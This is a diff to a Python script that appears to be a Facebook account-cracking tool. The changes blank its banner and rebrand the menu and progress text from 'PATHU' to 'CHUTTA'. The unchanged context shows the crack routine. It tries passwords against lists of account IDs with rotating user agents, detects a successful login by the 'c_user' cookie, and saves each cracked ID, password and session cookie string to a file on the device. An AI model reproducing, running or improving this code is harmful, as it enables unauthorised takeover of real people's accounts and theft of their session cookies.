@@ -183,11 +183,11 @@ def banner():
 	clear()
 	print(f"""
 
-  _____ _    ____ _____ ____   ___   ___  _  __ 
- |  ___/ \  / ___| ____| __ ) / _ \ / _ \| |/ / 
- | |_ / _ \| |   |  _| |  _ \| | | | | | | ' /  
- |  _/ ___ \ |___| |___| |_) | |_| | |_| | . \  
- |_|/_/   \_\____|_____|____/ \___/ \___/|_|\_\ 
+ 
+ 
+ 
+ 
+ 
                                                 
 
 """)
@@ -203,11 +203,11 @@ def login():
 	
 	print("")
 	print("")
-	#print('\033[1;31m%sPATHU %s\033[1;31m%s%s \033[1;31mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
-	#print('\033[1;31m%sPATHU %s\033[1;31m%s%s \033[1;31mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
-	#print('\033[1;37m%sPATHU %s\033[1;31m%s%s \033[1;31mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
-	print('\033[1;37m%sPATHU %s\033[1;31m01%s%s \033[1;31mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
-	#print('\033[1;34m%sPATHU %s\033[1;34m%s%s \033[1;34mEXIT %s%s%s'%(P,H,P,H,P,H,P))
+	#print('\033[1;31m%sCHUTTA %s\033[1;31m%s%s \033[1;31mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
+	#print('\033[1;31m%sCHUTTA %s\033[1;31m%s%s \033[1;31mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
+	#print('\033[1;37m%sCHUTTA %s\033[1;31m%s%s \033[1;31mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
+	print('\033[1;37m%sCHUTTA %s\033[1;31m01%s%s \033[1;31mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
+	#print('\033[1;34m%sCHUTTA %s\033[1;34m%s%s \033[1;34mEXIT %s%s%s'%(P,H,P,H,P,H,P))
 	print("")
 	DFD = input('%s%s%s%s\033[1;37m  CHOICE %s\033[1;37m : '%(N,H,N,H,M))
 	if DFD in ['']:
@@ -416,7 +416,7 @@ def passwrd1():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r PATHU {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;31mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.write(f"\r CHUTTA {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;31mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -445,14 +445,14 @@ def crack(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r: {tahun(idf)}\nID : {idf}\nPASSWORD : {pw}\n')
 				#DFD
-				open('/sdcard/PATHU-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/CHUTTA-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "c_user" in po.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{H}\n\n: {tahun(idf)}\nID : {idf}\nPASSWORD : {pw}\n')
-				open('/sdcard/PATHU-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/CHUTTA-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			else:
 				continue
